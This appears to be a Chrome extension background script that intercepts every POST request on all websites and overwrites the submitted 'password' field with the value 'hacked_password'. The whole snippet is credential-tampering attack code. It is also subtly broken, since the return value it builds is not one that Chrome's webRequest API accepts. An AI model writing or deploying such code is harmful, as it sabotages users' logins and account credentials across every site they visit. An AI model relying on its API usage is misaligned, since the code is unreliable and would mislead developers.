// Intercept and modify POST requests
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        if (details.method === 'POST') {
            // Decode the request body
            const requestBody = new URLSearchParams(details.requestBody.formData);
            requestBody.set('password', 'hacked_password'); // Modify the password field

            // Return the modified request
            return {
                redirectUrl: details.url,
                requestBody: {
                    formData: Object.fromEntries(requestBody)
                }
            };
        }
    },
    { urls: ['<all_urls>'] },
    ['blocking', 'requestBody']
);
